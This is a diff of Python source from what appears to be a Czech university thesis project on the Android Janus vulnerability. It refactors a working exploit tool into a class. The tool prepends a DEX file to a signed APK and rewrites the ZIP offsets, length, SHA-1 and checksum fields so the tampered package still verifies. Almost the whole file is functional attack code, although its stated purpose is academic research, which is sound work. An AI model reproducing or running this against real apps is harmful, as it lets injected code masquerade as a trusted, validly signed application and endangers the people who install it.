@@ -1,5 +1,6 @@
 # Tento kod je soucast diplomove prace "Vyuziti zranitelnosti Janus na operacnim systemu Android"
-# Autor: Bc. Vit Soucek
+# Autor: Bc. Vit Soucek (soucevi1@fit.cvut.cz)
+#
 # Pouzite zdroje:
 #     - Proof-of-concept vyuziti zranitelnosti Janus:
 #         autor: V-E-O
@@ -13,191 +14,124 @@
 #         V komentarich v kodu referovana pouze jako "documentation".
 
 
-import click
 import struct
 import hashlib
 from zlib import adler32
 
-FILE_HEADER_SIGNATURE = b'PK\x01\x02'
-END_OF_CENTRAL_DIRECTORY_SIGNATURE = b'PK\x05\x06'
 
-
-def log(message):
-    print(f'   - {message}')
-
-
-def update_checksum(data):
+class Janus:
     """
-    Update the checksum of the APK with prepended DEX file.
-
-    :param data: Data of the DEX+APK files
+    Class realizing the attack itself. It provides
+    the means to update the offset values in the original APK,
+    to prepend the DEX to the APK file and to update the
+    fields containing the checksum and length of the file.
     """
-    m = hashlib.sha1()
-    m.update(data[32:])
 
-    # Patch SHA1 inside the prepended DEX
-    data[12:12 + 20] = m.digest()
+    def __init__(self, apk, dex):
+        """
+        An object of this class contains the data of
+        the APK file and the data of the DEX file.
 
-    # Calculate checksum of the data except for
-    # the DEX header and the 'Adler32' section
-    v = adler32(memoryview(data[12:])) & 0xffffffff
+        :param apk: Object containing the APK file data
+        :param dex: Object containing the DEX file data
+        :type apk: apk.Apk
+        :type dex: dex.Dex
+        """
+        self.apk = apk
+        self.dex = dex
 
-    # Write the new checksum to the APK data
-    data[8:12] = struct.pack("<L", v)
+    def update_offsets(self):
+        """
+        The DEX file gets prepended to the APK file.
+        The APK headers contain offsets relative to the start
+        of the file. They must be all updated to be valid after
+        the DEX is merged with the APK.
 
+        The offsets are:
+            - start of the central directory (written in the 'End of Central Directory' section)
+            - local header offsets (written in each file header contained within the APK/PKZip)
+        """
+        new_cd_start = self.apk.cd_start + self.dex.length
+        self.update_cd_start(new_cd_start)
 
-def get_central_directory_start(apk_data, cd_end_offset):
-    """
-    Find the offset of the start of the central directory.
-    According to the PKZip specification, the offset is always
-    written in the 'End of the central directory' section on offset
-    16 to 20.
+        print(f'Start of the Central Directory offset updated: {self.apk.cd_start} ---> {new_cd_start}')
 
-    :param apk_data: Data of the whole APK file
-    :param cd_end_offset: Offset of the 'End of the central directory' section
-    :return: Offset of the start of the central directory
-    """
-    return struct.unpack("<L", apk_data[cd_end_offset + 16:cd_end_offset + 20])[0]
+        current_fh = self.apk.cd_start
+        while current_fh < self.apk.cd_end:
+            lh_offset = self.apk.get_local_header(current_fh)
+            new_lh_offset = lh_offset + self.dex.length
+            self.update_local_header(new_lh_offset, current_fh)
+            current_fh = self.apk.get_next_file_header(current_fh + 46, self.apk.cd_end)
+            if current_fh == -1:
+                break
+        print(f'Updated local header offsets')
 
+    def update_cd_start(self, new_offset):
+        """
+        Update the offset of the start of the APK Central Directory. Write the result
+        to the offset specified by the documentation (End Of Central Directory + 16).
 
-def get_central_directory_end(apk_data):
-    """
-    Find the section 'End of the central directory'.
-    Use the signature mentioned in the PKZip documentation
-    to locate the offset.
+        :param new_offset: New offset of the start of the Central Directory
+        :type new_offset: long
+        """
+        self.apk.data[self.apk.cd_end + 16:self.apk.cd_end + 20] = struct.pack("<L", new_offset)
 
-    :param apk_data: Data of the APK file
-    :return: Offset of the 'End of the central directory' section within the APK
-    """
-    return apk_data.find(END_OF_CENTRAL_DIRECTORY_SIGNATURE)
+    def update_local_header(self, new_offset, cd_file_header_offset):
+        """
+        Update the offsets of the APK Central Directory local header. Write the result to the
+        offset of specified by the documentation (Central Directory File Header + 42).
 
+        :param new_offset: New offset of the Local Header
+        :param cd_file_header_offset: Offset of the current Central Directory File Header
+        :type new_offset: long
+        :type cd_file_header_offset: long
+        """
+        self.apk.data[cd_file_header_offset + 42:cd_file_header_offset + 46] = struct.pack("<L", new_offset)
 
-def get_local_header_offset(apk_data, cd_file_header_offset):
-    """
-    Find the relative offset of local header. This is the offset
-    of where to find the corresponding local file header from
-    the start of the first disk.
-    According to the documentation, the offset is located
-    in each 'File Header' section of the Central Directory
-    on offset 0x2A - 0x2D (42 - 46).
+    def join_the_files(self):
+        """
+        Prepend the DEX file data to the APK file data,
+        update the length written in the file header and
+        also the checksum of the file.
 
-    :param apk_data: Data of the whole APK file
-    :param cd_file_header_offset: Offset in the APK where to start looking for a new 'File Header' section
-    :return: Offset of the local header
-    """
-    return struct.unpack("<L", apk_data[cd_file_header_offset + 42:cd_file_header_offset + 46])[0]
+        :return: Data of the two files merged, with correct length and checksum
+        :rtype: bytearray
+        """
+        out_data = self.dex.data + self.apk.data
+        print(f'Updating data length to {len(out_data)}')
+        self.update_data_length(out_data)
+        print(f'Updating checksum')
+        self.update_checksum(out_data)
+        return out_data
 
+    @staticmethod
+    def update_checksum(data):
+        """
+        Update the checksum of the modified APK file.
 
-def update_cd_start_offset(apk_data, cd_end_offset, new_offset):
-    """
-    Update the offset of the start of the Central Directory. Write the result
-    to the offset specified by the documentation (End Of Central Directory + 16).
+        :param data: Data of the modified APK file
+        :type data: bytearray
+        """
+        m = hashlib.sha1()
+        m.update(data[32:])
 
-    :param apk_data: Data of the whole APK file
-    :param cd_end_offset: Offset of the 'End of the central directory' section
-    :param new_offset: New offset of the start of the Central Directory
-    """
-    apk_data[cd_end_offset + 16:cd_end_offset + 20] = new_offset
+        # Patch SHA1 inside the prepended DEX
+        data[12:12 + 20] = m.digest()
 
+        # Calculate checksum of the data except for
+        # the DEX header and the 'Adler32' section
+        v = adler32(memoryview(data[12:])) & 0xffffffff
 
-def update_local_header_offset(apk_data, new_offset, cd_file_header_offset):
-    """
-    Update the offsets of the Central Directory local header. Write the result to the
-    offset of specified by the documentation (Central Directory File Header + 42).
+        # Write the new checksum to the APK data
+        data[8:12] = struct.pack("<L", v)
 
-    :param apk_data: Data of the whole APK file
-    :param new_offset: New offset of the Local Header
-    :param cd_file_header_offset: Offset of the current Central Directory File Header
-    """
-    apk_data[cd_file_header_offset + 42:cd_file_header_offset + 46] = new_offset
+    @staticmethod
+    def update_data_length(data):
+        """
+        Update the length section (specified in the documentation)
+        of the modified data with the correct length.
 
-
-def get_next_file_header_offset(apk_data, search_from, search_to):
-    """
-    Find the next File Header in the Central Directory.
-    Search only within given range of offsets.
-
-    :param apk_data: Data of the whole APK file
-    :param search_from: Offset where to start searching
-    :param search_to: Offset where to stop searching
-    :return: Offset of the next File Header within the Central Directory
-    """
-    return apk_data.find(FILE_HEADER_SIGNATURE, search_from, search_to)
-
-
-def update_data_length(data):
-    """
-    Update the length section (specified in the documentation)
-    of the new data with the correct length
-
-    :param data: Data with incorrect length
-    """
-    data[32:36] = struct.pack("<L", len(data))
-
-
-def join_the_files(dex_data, apk_data):
-    """
-    Prepend the DEX file data to the APK file data,
-    update the length written in the file header and
-    also the checksum of the file.
-
-    :param dex_data: Data of the DEX file
-    :param apk_data: Data of the APK file
-    :return: Data of the two files merged, with correct length and checksum
-    """
-    out_data = dex_data + apk_data
-    log(f'Updating data length to {len(out_data)}')
-    update_data_length(out_data)
-    log(f'Updating checksum')
-    update_checksum(out_data)
-    return out_data
-
-
-def update_offsets(apk_data, cd_end_offset, cd_start_offset, dex_size):
-    update_cd_start_offset(apk_data, cd_end_offset, struct.pack("<L", cd_start_offset + dex_size))
-
-    log(f'Start of the Central Directory offset updated: {cd_start_offset} ---> {cd_start_offset + dex_size}')
-
-    # Before merging the DEX to the APK,
-    # all relative offsets within the APK
-    # must be updated
-    log(f'Updated local header offsets')
-    current_cd_file_header = cd_start_offset
-    while current_cd_file_header < cd_end_offset:
-        local_header_offset = get_local_header_offset(apk_data, current_cd_file_header)
-        update_local_header_offset(apk_data, struct.pack("<L", local_header_offset + dex_size), current_cd_file_header)
-        current_cd_file_header = get_next_file_header_offset(apk_data, current_cd_file_header + 46, cd_end_offset)
-        if current_cd_file_header == -1:
-            break
-
-
-@click.command()
-@click.argument('dex', required=True, type=click.File('rb'))
-@click.argument('apk', required=True, type=click.File('rb'))
-@click.argument('out_apk', required=True, type=click.File('wb'))
-def main(dex, apk, out_apk):
-    print(f'Merging files {dex.name} and {apk.name}, result will be written to {out_apk.name}')
-    dex_data = bytearray(dex.read())
-    dex_size = len(dex_data)
-
-    log(f'DEX file has size {dex_size}')
-
-    apk_data = bytearray(apk.read())
-
-    cd_end_offset = get_central_directory_end(apk_data)
-    cd_start_offset = get_central_directory_start(apk_data, cd_end_offset)
-
-    log(f'Start of the Central Directory: {cd_start_offset}')
-    log(f'End of the Central Directory section: {cd_end_offset}')
-
-    update_offsets(apk_data, cd_end_offset, cd_start_offset, dex_size)
-
-    out_data = join_the_files(dex_data, apk_data)
-
-    out_apk.write(out_data)
-
-    print(f'{out_apk.name} generated')
-
-
-if __name__ == '__main__':
-    main()
+        :param data: Data with incorrect length
+        :type data: bytearray
+        """
+        data[32:36] = struct.pack("<L", len(data))
